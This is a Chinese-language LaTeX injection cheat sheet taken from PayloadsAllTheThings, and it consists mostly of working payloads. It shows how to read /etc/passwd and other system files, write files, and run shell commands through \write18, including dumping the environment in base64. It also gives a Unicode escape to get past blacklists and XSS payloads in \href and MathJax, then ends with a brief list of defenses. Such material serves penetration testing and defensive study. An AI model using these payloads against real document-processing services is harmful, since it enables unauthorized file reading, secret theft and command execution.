# LaTeX Injection - LaTeX注入

[SEARCH_KEYWORDS]
漏洞类型: LaTeX Injection LaTeX注入 Document Injection
攻击类型: File Read File Write Remote Code Execution XSS
关键词: LaTeX tex document typesetting scientific academic
技术: input include write18 immediate newread newwrite
命令: \input \include \write18 \immediate \lstinputlisting

[CONTENT]

## LaTeX注入概述

LaTeX注入是一种注入攻击，恶意内容被注入到LaTeX文档中。LaTeX广泛用于文档准备和排版，特别在学术界。由于其强大的脚本功能，如果没有适当的保护措施，可能被攻击者利用执行任意命令。

## 文件读取

### 基本文件读取

```tex
\input{/etc/passwd}
\include{somefile}  # 加载.tex文件
```

### 单行文件读取

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

### 多行文件读取

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

### 原始内容读取(不解释)

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

### 停用控制字符

当注入点在文档头之后，停用特殊字符：

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

### Unicode绕过黑名单

```tex
\lstin^^70utlisting{/etc/passwd}
```

- ^^41 代表 A
- ^^7e 代表 ~

## 文件写入

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## 命令执行

### 基本命令执行

```tex
\immediate\write18{id > output}
\input{output}
```

### Base64编码绕过

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

### 管道执行

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```

## 跨站脚本(XSS)

### URL注入

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

### MathJax注入

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```

## 攻击场景

| 攻击类型 | Payload示例 |
|----------|-------------|
| 文件读取 | `\input{/etc/passwd}` |
| 文件写入 | `\write\outfile{content}` |
| 命令执行 | `\immediate\write18{cmd}` |
| XSS | `\href{javascript:alert(1)}{text}` |

## 防护措施

1. 禁用危险命令：`\write18`, `\input`, `\include`
2. 使用沙箱环境
3. 输入验证和过滤
4. 限制LaTeX功能

## 参考文档

原始来源: PayloadsAllTheThings/LaTeX Injection/README.md